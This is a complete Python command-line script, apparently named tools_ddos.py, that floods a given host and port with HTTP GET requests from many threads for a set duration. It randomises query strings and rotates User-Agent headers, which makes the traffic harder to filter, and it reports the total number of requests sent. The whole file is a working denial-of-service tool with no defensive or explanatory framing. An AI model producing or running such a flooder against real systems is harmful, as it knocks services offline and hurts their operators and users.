#!/usr/bin/env python3
import sys
import threading
import socket
import time
import random

def attack(target, port, duration, threads):
    target = target.replace('http://', '').replace('https://', '').split('/')[0]
    print(f"Starting Python flood attack on {target}:{port}")
    print(f"Duration: {duration}s, Threads: {threads}")
    
    stop_attack = False
    request_count = 0
    
    def flood():
        nonlocal request_count
        time_end = time.time() + int(duration)
        while time.time() < time_end and not stop_attack:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, int(port)))
                
                # Send various types of requests
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Mozilla/5.0 (X11; Linux x86_64)",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
                ]
                
                headers = f"GET /?{random.randint(1000,9999)} HTTP/1.1\r\n"
                headers += f"Host: {target}\r\n"
                headers += f"User-Agent: {random.choice(user_agents)}\r\n"
                headers += "Accept: */*\r\n"
                headers += "Connection: keep-alive\r\n\r\n"
                
                s.send(headers.encode())
                s.close()
                request_count += 1
                
            except Exception as e:
                pass
    
    threads_list = []
    for i in range(int(threads)):
        t = threading.Thread(target=flood)
        t.daemon = True
        threads_list.append(t)
        t.start()
    
    # Wait for attack duration
    time.sleep(int(duration))
    stop_attack = True
    
    for t in threads_list:
        t.join()
    
    print(f"Python attack completed. Total requests: {request_count}")

if __name__ == "__main__":
    if len(sys.argv) >= 5:
        attack(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    else:
        print("Usage: python3 tools_ddos.py <target> <port> <duration> <threads>")